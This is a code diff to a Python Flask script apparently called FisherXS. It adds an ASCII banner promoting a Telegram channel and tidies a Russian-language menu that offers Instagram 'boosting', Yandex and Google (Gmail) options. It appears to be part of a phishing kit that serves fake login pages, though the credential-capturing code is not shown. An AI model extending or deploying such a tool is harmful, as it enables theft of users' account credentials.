@@ -1,5 +1,19 @@
 from flask import Flask, render_template , request
 from colorama import Fore, Back, Style
+
+print(r''' _____ _     _             __  ______
+|  ___(_)___| |__   ___ _ _\ \/ / ___|
+| |_  | / __| '_ \ / _ \ '__\  /\___ \
+|  _| | \__ \ | | |  __/ |  /  \ ___) |
+|_|   |_|___/_| |_|\___|_| /_/\_\____/
+      наш канал t.me/exp_official
+''')
+
+
+
+
+
+
 def Google():
 	try:
 		app = Flask(__name__)
@@ -84,7 +98,7 @@ def insta1():
 
 
 def ask():
-	print("1. Сервис накрутки инсты\n2. Yandex\n3.Google(Gmail)")
+	print("1. Сервис накрутки инсты\n2. Yandex\n3. Google(Gmail)")
 	global step
 	step = input()
 	if int(step) == 1:
@@ -93,6 +107,7 @@ def ask():
 		yandex()
 	elif int(step) == 3:
 		Google()
+
 	else:
 		print("Такого номера нету !")
 		ask()
